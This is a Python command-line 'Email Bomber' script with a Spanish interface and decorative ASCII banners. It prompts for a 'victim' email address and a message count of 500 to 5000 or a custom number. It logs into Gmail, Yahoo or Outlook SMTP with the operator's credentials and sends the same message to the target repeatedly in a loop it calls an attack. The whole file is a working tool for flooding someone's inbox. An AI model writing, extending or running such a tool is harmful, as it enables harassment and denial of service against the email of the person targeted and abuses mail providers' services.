import smtplib
import sys
import getpass
from colorama import Fore,Back,Style
from time import sleep
from tqdm import tqdm
import time
import os

def clearConsole():
    command = 'clear'
    if os.name in ('nt', 'dos'):  
        command = 'cls'
    os.system(command)
def barra():
    loop= tqdm(total = 7000, position=0, leave=False)
    for k in range(7000):
        loop.set_description(Fore.MAGENTA+"Cargando...".format(k))
        loop.update(1)
    loop.close()
def banner():
    clearConsole()
    print(Fore.LIGHTRED_EX + '''
        ▄▄▄▄▄▄▄▄
  █   ▄██████████▄
 █▐   ████████████
 ▌▐  ██▄▀██████▀▄██
▐┼▐  ██▄▄▄▄██▄▄▄▄██
▐┼▐  ██████████████
▐▄▐████─▀▐▐▀█─█─▌▐██▄
  █████──────────▐███▌
  █▀▀██▄█─▄───▐─▄███▀
  █  ███████▄██████
     ██████████████
     █████████▐▌██▌
     ▐▀▐ ▌▀█▀ ▐ █
           ▐    ▌                        
           
'''+Fore.LIGHTWHITE_EX+'''                 
███████╗███╗   ███╗ █████╗ ██╗██╗                        
██╔════╝████╗ ████║██╔══██╗██║██║                   
█████╗  ██╔████╔██║███████║██║██║                   
██╔══╝  ██║╚██╔╝██║██╔══██║██║██║                       
███████╗██║ ╚═╝ ██║██║  ██║██║███████╗              
╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝              
'''+Fore.LIGHTRED_EX+'''                                                    
██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                     ''')
    s=Fore.YELLOW+'by: '+Fore.LIGHTMAGENTA_EX+'biyivi'
    for i in s:
        print (i, end="", flush=True)
        sleep(0.1)
    print("")



class Email_Bomber:
    count = 0

    def __init__(self):
        try:
            banner()
            print("")
            print("")
            s=Fore.RED+"💣️💥 "+'Iniciando Programa....'
            for i in s:
                print (i, end="", flush=True)
                sleep(0.1)
            print("")
            barra()
            print("")

            self.target = str(input("💣️"+Fore.YELLOW+' Ingresa el correo de la victima'+Fore.LIGHTGREEN_EX+' >>> '))
            self.mode = int(
                input("💥 "+ '''Elige la cantidad de mensajes que se enviaran:
                '''+Fore.LIGHTRED_EX+'''                [1]'''+Fore.LIGHTYELLOW_EX+''' (5000)
                '''+Fore.LIGHTRED_EX+'''                [2]'''+Fore.LIGHTYELLOW_EX+''' (1000)
                '''+Fore.LIGHTRED_EX+'''                [3]'''+Fore.LIGHTYELLOW_EX+''' (500)
                '''+Fore.LIGHTRED_EX+'''                [4]'''+Fore.LIGHTYELLOW_EX+''' (custom)

'''+Fore.LIGHTGREEN_EX+'''>> '''))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print(Fore.LIGHTRED_EX+'ERROR: Opcion invalida. Cargando....')
                time.sleep(3)
                Email_Bomber()
        except Exception as e:
            print(f'ERROR: {e}')
            Email_Bomber()

    def bomb(self):
        try:
            print(" ")
            print("💣️ "+Fore.YELLOW+ 'Configurando... ')
            self.amount = None
            if self.mode == int(1):
                self.amount = int(5000)
            elif self.mode == int(2):
                self.amount = int(1000)
            elif self.mode == int(3):
                self.amount = int(500)
            else:
                self.amount = int(input("💣️" +Fore.LIGHTYELLOW_EX+ " Ingresa una cantidad" ">> "))
        except Exception as e:
            print(f'ERROR: {e}')
            Email_Bomber()

    def email(self):
        try:
            print(" ")
            print(Fore.YELLOW+"💥 "+ 'Configuración del correo electrónico')
            print(" ")
            self.server = str(
                input(Fore.YELLOW+ '''Ingresa una opcion 
                '''+Fore.LIGHTRED_EX+Fore.LIGHTRED_EX+'''[1]'''+Fore.LIGHTYELLOW_EX+''' Gmail
                '''+Fore.LIGHTRED_EX+Fore.LIGHTRED_EX+'''[2]'''+Fore.LIGHTYELLOW_EX+''' Yahoo 
                '''+Fore.LIGHTRED_EX+Fore.LIGHTRED_EX+'''[3]'''+Fore.LIGHTYELLOW_EX+''' Outlook
                
'''+Fore.LIGHTGREEN_EX+'''>> '''))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(Fore.YELLOW+"💣️"+ 'Ingresa el numero del puerto: '))

            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input(Fore.YELLOW+"💣️💥 " + 'Ingresa tu correo : '))
            self.fromPwd = str(input(Fore.YELLOW+"💣️💥 " + 'Ingresa tu contraseña : '))
            self.subject = str(input(Fore.YELLOW+"💣️💥 " + 'Ingresa el "Asunto" : '))
            self.message = str(input(Fore.YELLOW+"💣️💥 " + 'Ingresa el mensaje : '))

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(Fore.LIGHTRED_EX+'ERROR: {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count += 1
            print(Fore.YELLOW+"💣️💥 "+'Mensaje enviado correctamente: {self.count}')
        except Exception as e:
            print(Fore.LIGHTRED_EX+'ERROR: {e}')

    def attack(self):
        print(Fore.LIGHTRED_EX+ "💣️💥 Atacando...")
        for email in range(self.amount + 1):
            self.send()
        self.s.close()
        print(Fore.LIGHTGREEN_EX + 'Ataque Terminado... ')
        sys.exit(0)


if __name__ == '__main__':

    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()
